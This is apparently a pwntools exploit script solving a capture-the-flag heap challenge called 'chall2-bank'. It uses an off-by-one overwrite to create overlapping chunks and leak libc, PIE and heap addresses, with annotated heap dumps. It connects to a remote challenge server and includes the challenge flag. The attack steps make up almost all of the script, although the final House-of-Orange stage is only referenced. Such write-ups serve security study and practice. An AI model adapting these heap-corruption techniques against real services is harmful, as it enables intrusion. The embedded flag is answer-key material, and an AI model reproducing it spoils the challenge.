from pwn import *
import sys

def alloc(title, size, desc):
	r.sendlineafter('status\n', '1')
	r.sendafter('account: ', title)
	r.sendlineafter('statement: ', str(size))
	r.sendline(desc)

def edit_title(idx, title):
	r.sendlineafter('status\n', '2')
	r.sendlineafter('account: ', str(idx))
	r.send(title)

def edit_desc(idx, desc):
	r.sendlineafter('status\n', '3')
	r.sendafter('account: ', str(idx))
	r.sendline(desc.ljust(len(desc) - 2), 'A')

def free(idx):
	r.sendlineafter('status\n', '4')
	r.sendlineafter('account: ', str(idx))

def show(idx):
	r.sendlineafter('status\n', '5')
	r.sendlineafter('account: ', str(idx))

def leak(idx):
	show(idx)
	r.recvuntil('Statement: ')
	return u64(r.recv(6).ljust(8, chr(0)))

def leak_pie(idx):
	show(idx)
	r.recvuntil('lelelele')
	return u64(r.recv(6).ljust(8, chr(0)))

def pwn():

	alloc('0', 0x10, '0') # 0

	free(0)

	alloc('1', 0x30, '0') # 0
	alloc('2', 0x10, '1') # 1
	alloc('3', 0x50, p64(0x31)*8) # 2
	alloc('4', 0x60, '3') # 3

	free(0)

	# 0x555555757000:	0x0000000000000000	0x0000000000000031 <-- free
	# 0x555555757010:	0x0000000000000000	0x0000000000000000
	# 0x555555757020:	0x0000000000000000	0x0000000000000000
	# 0x555555757030:	0x0000000000000000	0x0000000000000021 <-- account #1 desc
	# 0x555555757040:	0x3131313131313131	0x00000a3131313131
	# 0x555555757050:	0x0000000000000000	0x0000000000000041 <-- free
	# 0x555555757060:	0x0000000000000000	0x3030303030303030
	# 0x555555757070:	0x3030303030303030	0x3030303030303030
	# 0x555555757080:	0x3030303030303030	0x00000a3030303030
	# 0x555555757090:	0x0000000000000000	0x0000000000000031 <-- account #1
	# 0x5555557570a0:	0x0000555555756010	0x0000000000000010
	# 0x5555557570b0:	0x0000555555757040	0x00000000006c656c

	# trigger off-by-one in account #1
	alloc('0'*0x10 + p8(0xc1), 0x30, '0') # 0

	# 0x555555757000:	0x0000000000000000	0x0000000000000031 <-- account #0
	# 0x555555757010:	0x0000555555756010	0x0000000000000010
	# 0x555555757020:	0x0000555555757060	0x3030303030303030
	# 0x555555757030:	0x3030303030303030	0x00000000000000c1 <-- account #1 title, size overwritten
	# 0x555555757040:	0x3131313131313131	0x00000a3131313131
	# 0x555555757050:	0x0000000000000000	0x0000000000000041
	# 0x555555757060:	0x3030303030303030	0x3030303030303030 <-- account #0 desc
	#
	#
	# 0x5555557570e0:	0x0000555555757100	0x0000000000000033
	# 0x5555557570f0:	0x0000000000000000	0x0000000000000061 <-- making sure there is a valid chunk at 0x555555757030 + 0xc0

	free(1)

	# overlap remainder chunk with account #0 desc chunk and leak libc
	alloc('1', 0x10, '1') # 1

	libc = leak(0) - 0x3c1b58
	_io_list_all = libc + 0x3c2500
	log.success('Libc: 0x{:x}'.format(libc))
	
	alloc('lelelele', 0x10, 'X') # 4
	alloc('lelelele', 0x30, 'Y') # 5
	
	marker = leak_pie(5)
	pie    = marker - 0x202010
	array  = pie + 0x202060

	log.success('PIE:  0x{:x}'.format(pie))

	r.sendlineafter('status\n', '1')
	r.sendafter('account: ', 'pwn')
	r.sendlineafter('statement: ', str(0xc))
	r.sendline(p64(array))

	heap = leak(2) - 0x10
	log.success('Heap: 0x{:x}'.format(heap))

	# patch account #2 chunk header
	edit_title(5, p64(0x91))
	# overwrite account #5 title size to trigger overflow afterwards
	edit_title(1, p64(0x600))
	# before we overlapped chunks and overwrote account #2 desc ptr
	# with the bss array in order to leak heap.
	# now we need to patch it with p64(0) to avoid crashing _int_free
	# when it free's it
	edit_title(5, p64(0x71) + p64(marker) + p64(0x21) + p64(0))

	free(2)

	# Perform HoO bypass
	# http://blog.rh0gue.com/2017-12-31-34c3ctf-300/
	
	# flag{Gu4rd_at_MALLOC_HOOK_bu1_n0t_4t_FREE_HOOK??}
	r.interactive()

if __name__ == "__main__":
	if sys.argv[1] == "r":
		r = remote('185.168.131.144', 6000)
	else:
		r = process('./chall2-bank')
		pause()

	pwn()
